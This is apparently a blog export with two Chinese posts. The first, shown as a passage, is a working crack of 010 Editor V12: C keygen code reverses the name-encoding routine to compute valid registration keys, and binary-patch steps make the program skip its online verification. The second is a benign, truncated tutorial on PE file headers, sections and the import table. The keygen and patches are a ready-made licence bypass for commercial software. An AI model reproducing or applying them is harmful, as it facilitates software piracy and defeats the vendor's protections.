0x5CFF0261, 0x33AE061E, 0x3BB6345F, 0x5D814A75, 0x257B5DF4, 0x0A5C2C5B, 0x16A45527, 0x16F23945, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; int __fastcall EncodeName(const char * a1,char a3,char a4) { int v5; // ebp  int v6; // rax  int v7; // r13  int v8; // rbx  unsigned __int8 v9; // r14  unsigned __int8 v10; // si  unsigned __int8 v11; // r15  unsigned __int8 v12; // di  int v13; // eax  int v14; // r9  int v15; // er11  int v16; // r10  int v17; // ebp  int v18; // rcx  int v19; // rax  v5 = 0; v6 = -1; int lenOfname = 0; // 计算Name字符串长度  for (; a1[lenOfname]; lenOfname++); v7 = lenOfname; v9 = 0; v10 = (15 * a4)\u0026amp;0xff; //v10为8位整型，因此通过\u0026amp;0xff可取出低八位的数据  v11 = 0; v12 = (17 * a3)\u0026amp;0xff; for (int i = 0; i \u0026lt; v7; i++) { v13 = toupper(a1[i]); v14 = LockName[v12]; v15 = v5 + LockName[v13]; v16 = LockName[v10]; //这里只写了a2==1的分支，是因为我们所执行的分支中a2只会等于1  // ida反编译得到的代码转化成了unsigned __int8，因此这里也要\u0026amp;0xff取低八位  v17 = LockName[(v13 + 13) \u0026amp; 0xff]; v18 = (v13 + 47) \u0026amp; 0xff; v19 = v9; v12 += 9; v10 += 13; v9 += 19; v11 += 7; v5 = v16 + v14 + LockName[v19 ] + LockName[v18 ] * (v15 ^ v17); } return v5; }   当我们把Name编码并将数据返回给v25后，就可以通过key[4 - 7]与v25的关系求出key[4 - 7]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  char key[10]; key[3] = 0xac; //int v23 = rand() % 0x3E8; //al_48 = v23,而v23需要在[0x1，0x3E7]之间,我觉得给个常数就够了，并不需要rand int v23 = 0x89; //可使用该账号的人员数量 //int v29 = rand() + 0x49c8; //v29要大于v35 即49C7，也可以用一个满足要求的条件代替 int v29 = 0xffff; //一对Name和Password可使用的期限 char Name[100] = { 0 }; printf(\u0026#34;Name: \u0026#34;); scanf_s(\u0026#34;%s\u0026#34;, Name, 100); int v25 = EncodeName(Name,v29,v23); //通过 (v45 == (_BYTE)v25 \u0026amp;\u0026amp; (_BYTE)v14 == BYTE1(v25) \u0026amp;\u0026amp; v47 == BYTE2(v25) \u0026amp;\u0026amp; v48 == HIBYTE(v25)) = 1 关系求解key[4 - 7] for (int i = 0; i \u0026lt; 4; i++) { key[4 + i] = (v25 \u0026gt;\u0026gt; (i * 8)) \u0026amp; 0xff; }   求出key[4 - 7]后就可以把其余的key算出来了，我们先看第一个对key编码的算法，\n1 2  a1 = ((v23*0xb ^ 0x3421) - 19760)^0x7892 a1 = ((key[5]^key[2])+((key[7]^key[1])\u0026lt;\u0026lt;8))   通过第一个等式我们可以直接求出a1\n1  int fircall_var = (((v23 * 0xb) ^ 0x3421) - 19760) ^ 0x7892;   观察第二个等式我们可以发现，key[5] ^ key[2] 为a1的低八位，且key[5]是已知的，而key[7] ^ key[1]则左移8位到了高八位，且key[7]已知，可通过如下方法求出key[2]与key[1]\n1 2  key[2] = (fircall_var \u0026amp; 0xff) ^ key[5]; key[1] = ((fircall_var \u0026gt;\u0026gt; 8) \u0026amp; 0xff) ^ key[7];   对待第二个对key编码的算法同理，这就不再赘述，直接放代码\n1 2 3 4  int seccall_var = ((((v29 * 0x11) ^ 0xffe53167 )+ 180597) ^ 0x22c078 ^ 0x5b8c27) \u0026amp; 0xffffff; key[0] = (seccall_var \u0026amp; 0xff) ^ key[6]; key[8] = ((seccall_var \u0026gt;\u0026gt; 8) \u0026amp; 0xff) ^ key[4]; key[9] = ((seccall_var \u0026gt;\u0026gt; 16) \u0026amp; 0xff) ^ key[5];   那么注册机代码编写就完成了，结果如下\n0x03 忽略网络验证 我们会发现通过逆向得到的正确的Password 会失效，会弹出如下提示，\n并且我们再次进入x64dbg中发现的关键函数会发现程序的执行分支改变了\n程序在地址7FF79246AD83处并未发生跳转，并且eax = 113，退出该函数继续跟踪，我们会发现这样一个程序执行到了这样一个函数\n我们进入该函数，并且ida也跳转至该函数进行查看\nida查找该函数也是先搜索程序提示的字符串，然后发现进入该分支需要v19 = 0，因此给v19赋值的函数就为我们在x64dbg发现的函数，进入该函数分析，找到返回值为0以及返回值大于0的分支\n在该函数中关键的代码为下面几个if，\n第一个if条件为a2，但是我们发现a2传入的时候为0，且在函数内一直没被更改，因此第一个if并不执行，而return 0xffffffff 又是小于0的数，那么我们只需确保不会进入第二个if，并把0xffffffff 改为 0x1即可\n那么进入sub_14000AEED函数中，直接把返回值改为1，并把return 0xffffff改为0x1即可。\n更改完成后继续跟踪会发现程序将运行到一个分支跳转处，若该分支不跳转则会出现网络验证失败的警告。我们单步调试发现此处跳转了，如果我们之前并不更改网络验证的返回值为大于0的数，那么此处不会发生跳转。\n我们往下看，在地址7FF792315587处call了7FF7921284F4函数，这个函数就是前面需要返回0xDB的关键函数，此时发生跳转后将会再次执行该函数。\n调试进入关键函数，会发现他仍然执行了mov eax,113的指令，如果继续运行程序，那么程序将会弹出Password是无效错误的警告。解决该问题的办法就是在这个地方直接返回0xDB，因此我们直接将mov eax,113 改为 mov eax,0xDB即可.\n打上补丁再次运行即可忽略网络验证，并继续使用了。\n","permalink":"http://int80.top/010editorcracker/","tags":["逆向","破解"],"title":"010editor 最新V12版本逆向算法以及暴力破解"},{"categories":["逆向"],"contents":"PE文件基本概述 PE文件可分为PE头与PE体。DOS头到节区头都是PE头部份，其下节区合称为PE体，并且PE节区紧跟在NT头后。\n对于PE文件结构的分析，我们需要明确如下几个概念\n虚拟地址：内存中使用Virtual Address来表示位置，VA指的是进程虚拟内存的绝对地址。\n相对虚拟地址：要与虚拟地址区别开来，相对虚拟地址(Relative Virtual Address)指的是从某个基准位置(ImageBase)开始的相对地址。VA与RVA存在一个换算关系\n​ RVA + ImageBase = VA\n为什么要这样做？这样做有个好处，当PE文件的内部数据都以相对虚拟地址存在的时候，当文件从硬盘加载到内存，若加载出存在了文件，那么该文件就应该进行重定位，如果使用RVA，文件进行重定位后并不影响该文件数据的定位，因为此时只需要根据重定位的定制变更ImageBase就可以正常定位到所有原来的地址。如果是使用VA，当重定位后，每个地址都需要一起改变，否则就会定位失败，读取不到正确的信息。\n映像(Image)：PE文件加载到内存时，文件不会全部加载，而是根据节区头起始地址、节区大小等属性值来加载。因此内存和磁盘中的PE具有不同的形态。把加载到内存的形态称为映像加以区别。\n节：节是PE文件中代码或数据的基本单位。可分为三个大类，代码(.text)、数据(.data)、资源(.src)节。\n最小基本单位：我们知道内存中的数据存放时是按照最小基本单位的倍数进行放入，也就是段、页的概念，如果数据被按照这样存入内存，当数据的大小不能刚好填充满最小基本单位的倍数时，就会用NULL填充，因此在PE头与各节区的尾部都存在一个区域，称为NULL填充。最小基本单位是为了提高处理文件、内存、网络包的效率。具体可以自行去了解。\n各节区头定义了各节区在文件或内存中的大小、位置、属性等。\n需特别说明，在Intel的CPU以小端序保存数据，即高位字节保存在高位地址\nDOS头 DOS头存在的目的是为了让PE文件兼容DOS文件。\nDOS头为一个名为IMAGE_DOS_HEADER的结构体，用来扩展已有的DOS EXE头\n该结构体总共64字节，成员有19个，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  （最左边是文件头的偏移量。） IMAGE_DOS_HEADER STRUCT { +0h WORD e_magic // MZ(4Dh 5Ah) DOS可执行文件标记 +2h WORD e_cblp +4h WORD e_cp +6h WORD e_crlc +8h WORD e_cparhdr +0ah WORD e_minalloc +0ch WORD e_maxalloc +0eh WORD e_ss +10h WORD e_sp +12h WORD e_csum +14h WORD e_ip +16h WORD e_cs +18h WORD e_lfarlc +1ah WORD e_ovno +1ch WORD e_res[4] +24h WORD e_oemid +26h WORD e_oeminfo +29h WORD e_res2[10] +3ch DWORD e_lfanew ``// RVA 指向PE文件头 } IMAGE_DOS_HEADER ENDS   但我们只需要了解两个成员即可。\n分别是\ne_magic：DOS签名(DOS signature：4D5A=\u0026gt;ASCII值\u0026quot;MZ\u0026quot;)，固定为MZ，MZ为MS-DOS的设计者Mark Zbikowski的缩写\ne_lfanew：指示NT头的偏移，不同文件值可能不同。\n其余的参数都是在MS-DOS下运行改成需要用的到。\ne_lfanew的偏移为0x3C，第60个字节，我们可以看到其保存了一个地址E0，而这个地址就是PE文件的开始的位置，并且这个地址的数据默认为\u0026quot;PE00\u0026quot;，我们后面会进行更详细讲解。\nDOS存根 在DOS头后面紧接着就是MS-DOS程序。被称为DOS存根，是可选项，即有没有DOS存根程序都可以运行，并且其大小不固定。\n40-4D区域为16位的汇编指令，一个可执行文件在Windows中由于被识别为PE文件，所以DOS存根的代码不被执行；在DOS环境下运行即可执行该代码。该段汇编代码就是输出\u0026quot;This program cannot be run in DOS mode（此程序不能在DOS模式下运行）”这条消息，然后终止程序。\n我们可以通过对DOS存根的修改，在EXE文件中创造出另一个文件，使它能在DOS和Windows都能运行，但分别运行的是16位DOS代码，32或64位window代码\n若希望程序尽可能小，可以把DOS存根删除。\nNT头 DOS存根后紧接着NT头\nNT头为一个IMAGE_NT_HEADERS结构体，大小为F8\n1 2 3 4 5 6  IMAGE_NT_HEADERS STRUCT { DWORD Signature IMAGE_FILE_HEADER FileHeader //偏移0x04  IMAGE_OPTIONAL_HEADER32 OptionalHeader //偏移0x18 } IMAGE_NT_HEADERS ENDS   Signature成员被设置为4550=\u0026gt;ASCII码为\u0026quot;PE00\u0026quot;，Signature的地址也即NT头开始的地址，在DOS头的e_lfanew中表明了。\n另外两个成员分别是文件头与可选头\nNT头：文件头 1 2 3 4 5 6 7 8 9 10  struct IMAGE_FILE_HEADER { WORD Machine; //运行平台  WORD NumberOfSections; //区块表的个数  DWORD TimeDataStamp;//文件创建时间，是从1970年至今的秒数  DWORD PointerToSymbolicTable;//指向符号表的指针  DWORD NumberOfSymbols;//符号表的数目  WORD SizeOfOptionalHeader;//IMAGE_NT_HEADERS结构中OptionHeader成员的大小，对于win32平台这个值通常是0x00e0  WORD Characteristics;//文件的属性值 偏移为0x12 }     Mechine 成员是根据每个CPU拥有的唯一的Machine码进行填写，在winnt.h文件中定义了每个CPU对应的Machine码\n  NumberOfSection 为节区的数量，该值一定要大于0，并且如果与实际的节区数量不同会产生错误，Windows加载器限制的节的数量最大为96\n  TimeDateStamp 用于说明该文件被创建的时间\n  PointerToSymbolicTable 已经被废除\n  SizeOfOptionalHeader 值用来指出为可选头IMAGE_OPTIONAL_HEADER32结构体的长度，但结构体设置的时候大小已经固定，这样做的原因是Windows的PE装载器需要查看该成员的值，从而识别出IMAGE_OPTIONAL_HEADER32结构体的大小，并且PE32+使用的IMAGE_OPTIONAL_HEADER64大小与PE32的IMAGE_OPTIONAL_HEADER32不同，需要用该成员变量的值进行指示说明。对于32位来说其值是224字节，对于64位来说是240字节。\n  Characteristics 用来标识文件的属性，即文件是否是可运行状态，是否为DLL文件等信息，通过BIT OR进行组合。需要特别记住0002h和2000h两个值，分别代表文件是可执行的，文件是DLL类型\n  前四个字节为Signature，文件头从E5开始F8结束。我们一对一的进行分析\n  Machine码的值为0x014C，查看宏定义，其代表的是Intel386或后继CPU及其兼容的CPU\n  NumberOfSection为0x0003，节区数量为3，我们用PE编辑器查看，节区数量确实为3\n   TimeDataTemp为0x48025287\n  后面全为0的8个字节分别是PointerToSymbolTable**，**NumberOfSymbols\n  SizeOfOptionalHeader的值为0x00E0，十进制为224。\n  Characteristics为0x010F，该值为IMAGE_FILE_RELOCS_STRIPPED | IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LINE_NUMS_STRIPPED | IMAGE_FILE_LOCAL_SYMS_STRIPPED | IMAGE_FILE_32BIT_MACHINE宏定义的值相或得到的结果\n  NT头：可选头 1 2 3 4 5 6  typedef struct _IMAGE_DATA_DIRECTORY{ DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTIORY, *PIMAGE_DATA_DIRECTORY; #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  typedef struct _IMAGE_OPTIONAL_HEADER { //  // Standard fields.  //  WORD Magic; // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）  BYTE MajorLinkerVersion; // 链接程序的主版本号  BYTE MinorLinkerVersion; // 链接程序的次版本号  DWORD SizeOfCode; // 所有含代码的节的总大小  DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小  DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小  DWORD AddressOfEntryPoint; // 程序执行入口RVA  DWORD BaseOfCode; // 代码的区块的起始RVA  DWORD BaseOfData; // 数据的区块的起始RVA  //NT additional fields. 以下是属于NT结构增加的领域。  DWORD ImageBase; // 程序的首选装载地址  DWORD SectionAlignment; // 内存中的区块的对齐大小  DWORD FileAlignment; // 文件中的区块的对齐大小  WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号  WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号  WORD MajorImageVersion; // 可运行于操作系统的主版本号  WORD MinorImageVersion; // 可运行于操作系统的次版本号  WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号  WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号  DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为0  DWORD SizeOfImage; // 映像装入内存后的总尺寸  DWORD SizeOfHeaders; // 所有头 + 区块表的尺寸大小  DWORD CheckSum; // 映像的校检和  WORD Subsystem; // 可执行文件期望的子系统  WORD DllCharacteristics; // DllMain()函数何时被调用，默认为 0  DWORD SizeOfStackReserve; // 初始化时的栈大小  DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小  DWORD SizeOfHeapReserve; // 初始化时保留的堆大小  DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小  DWORD LoaderFlags; // 与调试有关，默认为 0  DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16，到这个成员共偏移0x5c  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表 } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;   在IMAGE_OPTIONAL_HEADER32结构体中，需要特别注意下面的成员\n  Magic 可执行文件得可选头结构体为IMAGE_OPTIONAL_HEADER32结构体的时候是10B，为IMAGE_OPIONAL_HEADER64结构体的时候为20B。ROM镜像就把B改为7.\n  AddressOfEntryPoint 持有程序入口点(EntryPoint)的RVA值，用来指出程序最先执行的代码的起始地址。为0的时候就从ImageBase地址执行。对于DLL文件来说是可选的\n  ImageBase 用来指出文件优先装入的地址，即程序装入内存后的第一个字节的首选地址，必须为64K的倍数。DLL默认为10000000H，EXE默认为00400000H。当文件载入内存后，EIP寄存器会设置为ImageBase+AddressOfEntryPoint\n  SectionAlignment，FileAlignment 其中的FileAlignment指定了节区在磁盘文件中的最小单位，值应该为200h到10000h之间的2的幂；而SectionAlignment指定了节区在内存中的最小单位，其必须大于等于FileAlignment的值。一个文件中SectionAlignment和FileAlignment的值可能相同也可能不相同。这两个量的值与之前说过的内存中最小基本单元的概念相同，节区在文件和内存所占的空间必须为FileAlignment和SectionAlignment的整数倍\n  SizeOfImage 当PE文件被加载到内存中的时候，加载的文件大小与整个文件的大小不同，该值就指定了Image在虚拟内存所占的大小，必须为SectionAlignment的倍数。\n  SizeOfHeaders 用来指出整个PE头的大小，该值必须是FileAlignment大小的整数倍。第一个节区相对该文件开始的地址的偏移量就是这个值的大小。向上舍入为FileAlignment的整数倍。PE头大小的计算方式为\n1  SizeOfHeaders = [e_lfanew /*DOS头部*/ + 4 /*PE签名*/ + sizeof(IMAGE_FILE_HEADER) + SizeOfOptionalHeader /*NT头*/ + sizeof(IMAGE_SECTION_HEADER) * NumberOfSections /*节区头的大小*/]/ FileAlignment * FileAlignment + FileAlignment;     Subsystem 该值用来区分系统驱动文件(*.sys)和普通可执行文件(*.exe)。值为1代表系统驱动(Drive)文件，2代表窗口应用程序GUI文件，3代表控制台应用程序CUI文件\n  NumberOfRvaAndSizes 用来指定DataDirectory数组的长度，翻看前面的结构体定义我们会发现DataDirectory的长度是用了一个宏IMAGE_NUMBER_DIRECTORY_ENTRIES来定义的，长度为16。但这个值同样也用来指定DataDirectory的长度，不会冲突吗？PE装载器是通过该值来识别数组的大小，因此DataDirectory的长度可以不是16\n  DataDirectory 是IMAGE_DATA_DIRECTORY结构体组成的数组，也就是结构体数组，其结构体的定义也在该节开始处给出了。\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  DataDirectory[0] = EXPORT Directory //导出表的地址和大小 DataDirectory[1] = IMPORT Directory //导入表的地址和大小 DataDirectory[2] = RESOURCE Directory //资源表的地址和大小 DataDirectory[3] = EXCEPTION Directory\t//异常表的地址和大小 DataDirectory[4] = SECURITY Directory //证书表的地址和大小 DataDirectory[5] = BASERELOC Directory //基址重定位表的地址和大小 DataDirectory[6] = DEBUG Directory //调试信息的起始地址和大小 DataDirectory[7] = COPYRIGHT Directory //特定于体系结构数据的地址和大小 DataDirectory[8] = GLOBALPTR Directory //全局指针寄存器相对虚拟地址 DataDirectory[9] = TLS Directory //(线程本地存储)TLS表的地址和大小 DataDirectory[A] = LOAD_CONFIG Directory //加载配置表地址和大小 DataDirectory[B] = BOUND_IMPORT Directory //绑定导入表的地址和大小 DataDirectory[C] = IAT Directory //导入地址表的地址和大小 DataDirectory[D] = DELAY_IMPORT Directory //延迟导入表的地址和大小 DataDirectory[E] = COM_DESCRIPTOR Directory //CLR运行时头部数据地址和大小 DataDirectory[F] = Reserved Directory //保留   其中最重要的是EXPORT和IMPORT Directory，前者是存放了EDT 导出目录表的虚拟地址和大小，从该文件导出的函数；后者是存放IDT导入目录表的虚拟地址和大小，从其余文件导入的函数。\n上图是可选头的数据，总共0xE0的大小，我们对上面提到的几个较为重要的值进行分析\n最开始的两个字节0x010B就是Magic的值，\n  AddressOfEntryPoint从108h处开始到10Bh总共4个字节，为0x739D，即该程序的入口地址的虚拟地址为0x0000739D\n  ImageBase从114h开始到117h，值为0x01000000。\n  SectionAlignment从118h到11Bh，值为0x00001000，所以节区在内存存放时要按照1000的倍数进行对齐存储\n  FileAlignment从11Ch到11Fh，值为0x000002000，所以节区在磁盘存放时要按照200的倍数进行对齐\n  SizeOfImage从130h到133h，值为0x00014000，当文件加载到内存后的总体大小，14000h也为1000h(SectionAlignment)的整数倍\n  SizeOfHeaders 从134h到137h，值为0x00000400，即PE头的大小\n  NumberOfDirectories 从154h到157h，值为0x00000010，是十六进制，换成十进制就为16\n  后面每八个字节就是DataDirectory数组的一个元素，前四个字节为相应的Directory的虚拟地址，后四个为该Directory的大小。在这里EXPORT Directory的虚拟地址从158h到15Bh，全为0；其size从15Ch到15Fh，为0。IMPORT Directory的虚拟地址从160h到163h，为0x00007604，size从164h到167h，为0x000000C8.\n节区头 定义节区头的结构体为IMAGE_SECTION_HEADER，包括了对应节的具体位置、长度、属性信息。总共0x24大小\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 节表名称,如“.text”  //IMAGE_SIZEOF_SHORT_NAME=8  union { DWORD PhysicalAddress; // 物理地址  DWORD VirtualSize; // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个  } Misc; //偏移0x08  DWORD VirtualAddress; // 节区的 RVA 地址  DWORD SizeOfRawData; // 在文件中对齐后的尺寸  DWORD PointerToRawData; // 在文件中的偏移量  DWORD PointerToRelocations; // 在OBJ文件中使用，重定位的偏移  DWORD PointerToLinenumbers; // 行号表的偏移（供调试使用地)  WORD NumberOfRelocations; // 在OBJ文件中使用，重定位项数目  WORD NumberOfLinenumbers; // 行号表中行号的数目  DWORD Characteristics; // 节属性如可读，可写，可执行等 偏移0x24 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;    Name 是一个8字节的ASCII字符串，但并没有\u0026quot;必须用ASCII值\u0026quot;的限制，并且没有规范明确的节区name，因此Name成员不能保证其百分百就用作某种信息，.code名的也可能是数据节区。如果字符串不足8字节用0x00填充，且并不遵守必须以\u0026quot;\\0\u0026quot;进行结尾，如果不是\u0026quot;\\0\u0026quot;结尾，则会截取8个字节的长度进行处理。可执行文件不支持长度超过8字节的节名。对于支持超过字节长度的文件来说，此成员会包含斜杠\u0026quot;/\u0026quot;，并在后面跟随一个用ASCII表示的十进制数，该数字是字符串表的偏移量。 Misc.VirtualSize 这个成员指定了该节区装入内存后的总大小，如果该值大于SizeOfRawData的值，那么大出的部分用0x00进行填充。这个成员只对可执行文件有效，如果是OBJ文件，此成员为0. VirtualAddress 指定了该节区装入内存虚拟空间后的节区起始地址，这个地址是一个相对虚拟地址，一般为SectionAlignment的整数倍。他加上ImageBase才是真正的虚拟地址 SizeOfRawData 指定了该节区在硬盘上初始化数据的大小，必须是FileAlignment的整数倍，如果该部分仅包含未初始化的数据，那么这个值为0 PointerToRawData 指出该节区在硬盘文件中的地址，这个数值从文件开始算起的偏移量，也就是这个地址是一个文件偏移地址，磁盘文件中节区的起始位置，必须是FileAlignment的整数倍，如果包含未初始化的数据，该成员为0 Characteristics 指出该节区的属性特征，不同的数据位代表不同属性，多个属性通过bit OR进行组合  节区头紧跟在NT头后，可以理解为就是一个IMAGE_SECTION_HEADER的结构体数组，成员个数就被定义在IMAGE_FILE_HEADER中的NumberOfSection成员上，需要注意的是在最后一个节区头后最好应该有一个与节表同样大小的用0x00填充的空白数据。\n拿一个节区进行说明，\n  0x2E74657874000000=\u0026gt;ASCII=\u0026quot;.text\u0026quot;，为什么这里不是小端序的表示方式。因为数组在内存中是连续的，无论大端序还是小端序，存储顺序都相同\n  0x00007748为VirtualSize为内存中节区的大小，0x00001000为该节区在内存的起始相对虚拟地址\n  0x00007800 为SizeOfRawData，为节区在磁盘的大小，0x00000400为节区在磁盘的起始地址，是相对文件起始地址的偏移地址\n  在1FCh，0x60000020为Characteristics成员的值，是由IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ bitOR得到的\n  RVA to RAW 我们看到，当PE文件从磁盘加载到内存中会发生的变换。\n因此我们需要学习节区是如何完成内存地址与文件偏移间的映射换算，根据公式：\n​ RAW - PointerToRawData = RVA - VirtualAddress\n​\tRAW = RVA - VirtualAddress + PointerToRawData\n其中PointerToRawData 与 VirtualAddress 为节区头结构体中的成员\n举个例子：当RVA=ABA8时，File Offset = ？\n1 2  1. 首先查找RVA ABA8位于的节区，这里位于节区.data 2. 根据公式换算 RAW = ABA8(RVA) - 9000(VA) + 7C00(PointerToRawData) = 97A8   观察发现，ABA8在第二个节区，而97A8在第三个节区。这种就属于\u0026quot;无法定义与RVA相对应的RAW值\u0026quot;。这种情况是因为.data节区的VirtualSize值要比SizeOfRawData值大。\nIAT IAT(Import Address Table) 导入地址表，此部分是PE头非常困难也是非常重要的知识点\nDLL DLL(Dynamic Link Library)动态链接库，其是为了解决不同程序使用相同库而需要重复加载库的冗余操作，可以避免严重的内存和磁盘浪费。\nDLL的概念描述：\n 不要把库包含到程序中，单独组成DLL文件，需要时调用 内存映射技术使加载后的DLL代码、资源在多个进程中实现共享 更新库时只要替换相关的DLL文件即可，简单易行  加载DLL的方式有两种：第一种是\u0026quot;显式链接\u0026quot;，程序使用DLL时加载，使用完毕后释放内存。第二种时\u0026quot;隐式链接\u0026quot;，程序开始时即一同加载DLL，程序终止时再释放占用内存。\nIMAGE_IMPORT_DESCRIPTOR IMAGE_IMPORT_DESCRIPTOR导入表的结构体定义如下：\n1 2 3 4 5 6 7 8 9 10 11  typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; //导入名称表(INT)的RVA地址  } DUMMYUNIONNAME; DWORD TimeDateStamp; //时间戳多数情况可忽略 如果是0xFFFFFFFF表示IAT表被绑定为函数地址  DWORD ForwarderChain; DWORD Name; //导入DLL文件名的RVA地址  DWORD FirstThunk; //导入地址表(IAT)的RVA地址 } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;   1 2 3 4 5 6 7 8 9 10  typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; //PBYTE  DWORD Function; //PDWORD  DWORD Ordinal; DWORD AddressOfData; //PIMAGE_IMPORT_BY_NAME  } u1; } IMAGE_THUNK_DATA32; typedef IMAGE_THUNK_DATA32 *PIMAGE_THUNK_DATA32; //注：这个结构体是联合类型的，每一个成员都是4字节，所以为了编程方便，完全可以用一个4字节的数组取代它。   1 2 3 4 5 6  typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; //注：这个结构体由两个成员组成，大致一看它的大小是3个字节，其实它的大小是不固定的， //因为无法判断函数名的长度，所以最后一个成员是一个以0结尾的字符串。   PE文件使用来自其他DLL的代码或者数据，称为导入。当PE文件装入时，PE装载器的工作之一就是定位所有被导入的函数和数据，并且让正在被装载的文件可以使用这些地址。这个过程就是通过PE文件的导入表来完成。\n导入表保存的是函数名和其驻留的DLL名等动态链接所需的信息\n  OriginalFirstThunk 是一个4字节的RVA地址，指向导入名称表(INT)，INT是一个IMAGE_THUNK_DATA结构体数组，这个结构体最后一个成员内容为NULL时数组结束。数组的每一个结构体成员又指向了一个IMAGE_IMPORT_BY_NAME结构体，这个结构体包含两个成员函数序号和函数名，这个序号一般没什么用，有的编译器会把其置0，函数名可以当作一个以0结尾的字符串。(INT表地址不在DataDirectory中)\n  Name DLL名字的指针，是一个RVA地址，因为是DLL文件名字这个字符串的地址，因此这个地址指向了一个以0结尾的ASCII字符串\n  FirstThunk 是4字节RVA地址，指向了导入地址表(IAT)，这个IAT和INT也是一个IMAGE_THUNK_dATA结构体数组，不过它在程序载入前和载入后有两种状态，在程序载入前它的结构和内容和INT表一样，但却是两个不同的表，指向了IMAGE_IMPORT_BY_NAME结构体。在程序载入后，它的结构和INT表一样，但内容不同了，里面存放的都是导入函数的地址 。(IAT表地址在DataDirectory中)\n  IAT提供的机制与隐式链接有关\nGetModuleHandle函数位于KERNEL32.dll中，我们可以看到010073AC地址的这一指令MOV EDI,DWORD PTD DS:[\u0026lt;\u0026amp;KERNEL32.GetModuleHandleA\u0026gt;]，后面接着CALL EDI里的数据，也就是函数地址。\n这两句指令就是获取GetModuleHandleA函数的地址，然后调用它。可以看到EDI保存的是75740A60这个地址，这个地址保存在010010CC处，这里获取函数地址是通过读取该函数的地址所存放的地址，也就是读取IAT表中，存放的该函数的地址。为什么要这么绕一圈，而不是直接读取呢？\n这是因为不同系统上、不同版本的KERNERL32.dll，其里面的函数的地址都可能会发生变化，因此每次加载DLL时通过将函数地址写入固定的地址，就可以避免函数地址不同导致的错误。\nDLL重定位也是造成这一问题的原因，如果两个DLL的ImageBase都相同，当一个DLL先把该地址占用了，第二个DLL加载的时候就需要移动到其他的空闲内存空间。因此如果直接读取DLL函数地址，当DLL发生重定位后，函数地址就会改变。\n还有一个原因就是PE头中表示地址的时候使用的时RVA而不是VA\n综上三个原因，最大的问题就是硬编码无法保证能读取到正确的不断变化的函数地址，因此需要额外的不会变化的内存空间来保存函数地址。\n从上面我们操作可以看出，被调用的函数的地址所存放的地址就位于IAT数组的地址上，因此加载后的IAT数组存放的是函数的地址。\nEXE文件载入后对应的导入表结构图\n书上提到\u0026quot;INT中个元素的值为IMAGE_IMPORT_BY_NAME结构体指针(有时IAT也拥有相同值)\u0026quot;，网上资料和书上给的EXE文件载入前对应的导入表结构图如下图\n但我实际上用十六进制编辑器查看一个IMAGE_IMPORT_DESCRIPTOR的IAT和INT数组内容时，两者其实是不一样的。这部分我比较迷惑，IAT在加载前是不一定和INT一样都指向IMAGE_IMPORT_BY_NAME结构体数组吗，如果有错误还望得到指正\n首先通过DataDirectory找到Import Directory的地址，在前面对可选头学习的时候已经提到了，此处为00007604，这个为RVA地址，但是我们查看的是PE文件载入前的数据，因此需要从RVA换算成为RAW地址，7604 - 1000 + 400 = 6A04，6A04便是IMAGE_IMPORT_DESCRIPTOR结构体数组在磁盘中的起始位置，根据DataDirectory结构体中的Import Directory的Size数据可知，导入表的大小为C8，因此导入表的数据如下\n其中6A04h - 6417h为IMAGE_IMPORT_DESCRIPTOR结构体数组的第一个元素的数据，各个成员的值如下\n   文件偏移 成员 RVA RAW     6A04 OriginalFirstThunk(INT) 00007990 00006D90   6A10 Name 00007AAC 00006EAC   6A14 FirstThunk(IAT) 000012C4 000006C4    通过十六进制编辑器查看6D90和6C4的内容如下\nINT(RAW = 6D90)\nIAT(RAW = 6C4)\n两者的值并不相同。\n我们再通过Ollydbg，直接查看IAT数据，以如下图的函数为例\n我们在十六进制编辑器查看RAW = (010010CC - 01000000 - 1000 +400) = 4CCh的数据\n可以发现4CCh处的数据为7C80B731，与ollydbg的不同。\n我考虑到是不是这个用来练习的EXE文件有问题，于是换了一个EXE文件进行查看\n与之前同样的步骤，先从DataDirectory的获取IMPORT Directory的地址，在获得一个IMAGE_IMPORT_DESCRIPTOR结构体信息，这里就直接略过。\n其中INT的RVA为2074，转化为RAW为874。IAT的RVA为200C，转化为RAW为80C\nINT(RAW = 874)\nIAT(RAW = 